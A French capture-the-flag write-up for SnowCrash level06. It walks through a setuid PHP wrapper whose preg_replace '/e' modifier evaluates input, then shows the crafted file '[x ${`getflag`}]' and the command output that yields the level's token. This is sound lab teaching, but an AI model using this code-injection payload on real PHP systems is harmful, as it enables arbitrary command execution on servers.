on a un fichier .php et un exécutable

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

```
level06@SnowCrash:~$ cat -n level06.php
     1  #!/usr/bin/php
     2  <?php
     3  function y($m) {
     4          $m = preg_replace("/\./", " x ", $m);
     5          $m = preg_replace("/@/", " y", $m);
     6          return $m;
     7  }
     8  function x($y, $z) {
     9          $a = file_get_contents($y);
    10          $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    11          $a = preg_replace("/\[/", "(", $a);
    12          $a = preg_replace("/\]/", ")", $a);
    13          return $a;
    14  }
    15  $r = x($argv[1], $argv[2]);
    16  print $r;
    17  ?>
```

ce programme lit un fichier qui lui est passé en argument

le /e à la ligne 10 nous permet d'envoyer du code php au programme et il sera exécuté :
le programme recherche une string "[x `mon code`]" et exécute "y(`mon code`)"

pour injecter du code en php on utilise la syntaxe suivante : ${`code`}

on créé un fichier qui contient : [x ${\`getflag\`}]

```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/iwantthisflag
```

```
level06@SnowCrash:~$ ./level06 /tmp/iwantthisflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
